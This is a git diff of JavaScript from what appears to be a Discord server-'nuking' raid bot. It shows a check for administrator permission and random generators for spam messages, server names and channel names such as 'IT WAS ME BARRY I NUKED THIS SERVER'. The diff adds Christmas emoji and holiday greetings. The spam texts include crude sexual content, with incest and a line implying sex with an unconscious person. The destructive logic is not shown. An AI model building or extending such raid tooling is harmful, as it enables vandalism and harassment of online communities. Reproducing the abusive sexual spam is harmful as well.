@@ -416,33 +416,41 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  function randomT() {
-   var rand = [`Barry do you remember that time in high-school when you first had sex with a women? do you remember when you stuck it in and blew your load to quick? it was me barry! and then the second you penetrated her jerked you off to completion.`
+   var rand = [`🎄Barry do you remember that time in high-school when you first had sex with a women? do you remember when you stuck it in and blew your load to quick? it was me barry! and then the second you penetrated her jerked you off to completion.`
  ,
-`Barry do you remember that time you got hard just by looking at your mother? It was ME Barry! I waited and watched until you glanced at her then jerked you to hardness I made you oedipos`
+`🎄Barry do you remember that time you got hard just by looking at your mother? It was ME Barry! I waited and watched until you glanced at her then jerked you to hardness I made you oedipos`
 ,
-`Barry do you remember when your mother was bathing you and your brother in the tub but you had to get out of the tub early cause your brother peed in the tub? It was ME Barry I was the one that peed in the tub!`
+`❄️Barry do you remember when your mother was bathing you and your brother in the tub but you had to get out of the tub early cause your brother peed in the tub? It was ME Barry I was the one that peed in the tub!`
 ,
-`Barry do you remember when you came shit farted and peed all at the same time. It was ME Barry I made you into the cum shit fart piss man!`
+`⛄Barry do you remember when you came shit farted and peed all at the same time. It was ME Barry I made you into the cum shit fart piss man!`
 ,
-`Remember that time you tried to make a comfy Simpsons thread and it got derailed snee posters? It was ME Barry I the rouge derailed your thread!`
+`☃️Remember that time you tried to make a comfy Simpsons thread and it got derailed snee posters? It was ME Barry I the rouge derailed your thread!`
 ,
-`Barry do you remember when you tried to share your genuine opinions about cartoons on 4chan and it got mocked for having a different opinions. It was me Barry I was the anonymous!`
+`☃️Barry do you remember when you tried to share your genuine opinions about cartoons on 4chan and it got mocked for having a different opinions. It was me Barry I was the anonymous!`
 ,
-`Barry do you remember when you woke up with a sore ass that one morning when you were sick? It was ME Barry- I don't like this one...`
+`❄️Barry do you remember when you woke up with a sore ass that one morning when you were sick? It was ME Barry- I don't like this one...`
 ,
-`Remember that magnificent microwave casserole you had in your freezer? the one you were anticipating to taste for weeks but it blew up while it was left untended? It was ME Barry I was the one who blew up the casserole! `
+`⛄Remember that magnificent microwave casserole you had in your freezer? the one you were anticipating to taste for weeks but it blew up while it was left untended? It was ME Barry I was the one who blew up the casserole! `
 ,
-`Barry do you remember the time the chair was thrown? It was ME Barry I was the one who threw the chair!` 
+`🌨️Barry do you remember the time the chair was thrown? It was ME Barry I was the one who threw the chair!` 
 ,
-`https://youtu.be/fi36ePIX2kY`
+`❄️ https://youtu.be/fi36ePIX2kY`
 ,
-`Barry do you remember that time when you were sixteen and you fucked your sister in the dark because you thought she was unconscious? It was me Barry! I was your sister!`] 
+`❄️BARRY DO YOU REMEMBER THE TIME YOU GOT A PS5 FOR CHRISTMAS?**IT WAS ME BARRY I PUT THE PS5 UNDER THE CHRISTMAS TREE!**🎄`
+,
+`❄️BARRY DO YOU REMEMBER THE TIME YOU GOT A PS5 FOR CHRISTMAS?**IT WAS ME BARRY I PUT THE PS5 UNDER THE CHRISTMAS TREE!**🎄`
+,
+`🎄❄️MY PLAN WORKED BARRY! I NOW AM WISHING YOU AND EVERYONE MARRY CHRISTMAS AND HAPPY NEW YEAR!!!🎄❄️`
+,
+`🎄❄️MY PLAN WORKED BARRY! I NOW AM WISHING YOU AND EVERYONE MARRY CHRISTMAS AND HAPPY NEW YEAR!!!🎄❄️`
+,
+`☃️Barry do you remember that time when you were sixteen and you fucked your sister in the dark because you thought she was unconscious? It was me Barry! I was your sister!`] 
 return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomnames() {
-   var rand = ["𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘"]
+   var rand = ["🎄❄️MARRY CHRISTMAS BARRY", "❄️🎄𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "❄️🎄𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
@@ -454,7 +462,7 @@ return rand[Math.floor(Math.random()*rand.length)];
  
 
  function channelnames() {
-var rand = ["𝐈𝐓-𝐖𝐀𝐒-𝐌𝐄-𝐁𝐀𝐑𝐑𝐘-𝐈-𝐍𝐔𝐊𝐄𝐃-𝐓𝐇𝐈𝐒-𝐒𝐄𝐑𝐕𝐄𝐑", "𝐈𝐓-𝐖𝐀𝐒-𝐌𝐄-𝐁𝐀𝐑𝐑𝐘-𝐈-𝐍𝐔𝐊𝐄𝐃-𝐓𝐇𝐈𝐒-𝐒𝐄𝐑𝐕𝐄𝐑", "Barry do u remember the time the chair was thrown? It was ME Barry I was the1who threw the chair!", "𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "『ΛDᄃ』", "『ΛDᄃ』", "𝐁𝐀𝐑𝐑𝐘 𝐃𝐎 𝐘𝐎𝐔 𝐑𝐄𝐌𝐄𝐌𝐁𝐄𝐑 𝐖𝐇𝐄𝐍 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐓 𝐍𝐔𝐊𝐄𝐃❓", "𝗜 𝗔𝗠 𝗘𝗩𝗘𝗥𝗬𝗧𝗛𝗜𝗡𝗚 𝗕𝗔𝗗 𝗧𝗛𝗔𝗧 𝗘𝗩𝗘𝗥 𝗛𝗔𝗣𝗣𝗘𝗡𝗘𝗗 𝗧𝗢 𝗬𝗢𝗨", "𝐈 𝐉𝐄𝐑𝐊𝐄𝐃 𝐘𝐎𝐔 𝐎𝐅𝐅 𝐀𝐓 𝐒𝐔𝐏𝐄𝐑 𝐒𝐏𝐄𝐄𝐃 𝐒𝐎 𝐈𝐓 𝐒𝐄𝐄𝐌𝐄𝐃 𝐋𝐈𝐊𝐄 𝐘𝐎𝐔 𝐍𝐔𝐓𝐓𝐄𝐃 𝐀𝐓 𝐉𝐔𝐒𝐓 𝐀 𝐖𝐎𝐌𝐄𝐍𝐒 𝐓𝐎𝐔𝐂𝐇","卂丂丂ㄚ"]
+var rand = ["MARRY Christmas barry", "❄️𝐈𝐓-𝐖𝐀𝐒-𝐌𝐄-𝐁𝐀𝐑𝐑𝐘-𝐈-𝐍𝐔𝐊𝐄𝐃-𝐓𝐇𝐈𝐒-𝐒𝐄𝐑𝐕𝐄𝐑", "𝐈𝐓-𝐖𝐀𝐒-𝐌𝐄-𝐁𝐀𝐑𝐑𝐘-𝐈-𝐍𝐔𝐊𝐄𝐃-𝐓𝐇𝐈𝐒-𝐒𝐄𝐑𝐕𝐄𝐑", "🎄Barry do u remember the time the chair was thrown? It was ME Barry I was the1who threw the chair!", "☃️𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "☃️❄️『ΛDᄃ』", "❄️🎄☃️『ΛDᄃ』", "❄️𝐁𝐀𝐑𝐑𝐘 𝐃𝐎 𝐘𝐎𝐔 𝐑𝐄𝐌𝐄𝐌𝐁𝐄𝐑 𝐖𝐇𝐄𝐍 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐓 𝐍𝐔𝐊𝐄𝐃❓", "𝗜 𝗔𝗠 𝗘𝗩𝗘𝗥𝗬𝗧𝗛𝗜𝗡𝗚 𝗕𝗔𝗗 𝗧𝗛𝗔𝗧 𝗘𝗩𝗘𝗥 𝗛𝗔𝗣𝗣𝗘𝗡𝗘𝗗 𝗧𝗢 𝗬𝗢𝗨", "❄️☃️𝐈 𝐉𝐄𝐑𝐊𝐄𝐃 𝐘𝐎𝐔 𝐎𝐅𝐅 𝐀𝐓 𝐒𝐔𝐏𝐄𝐑 𝐒𝐏𝐄𝐄𝐃 𝐒𝐎 𝐈𝐓 𝐒𝐄𝐄𝐌𝐄𝐃 𝐋𝐈𝐊𝐄 𝐘𝐎𝐔 𝐍𝐔𝐓𝐓𝐄𝐃 𝐀𝐓 𝐉𝐔𝐒𝐓 𝐀 𝐖𝐎𝐌𝐄𝐍𝐒 𝐓𝐎𝐔𝐂𝐇","卂丂丂ㄚ"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
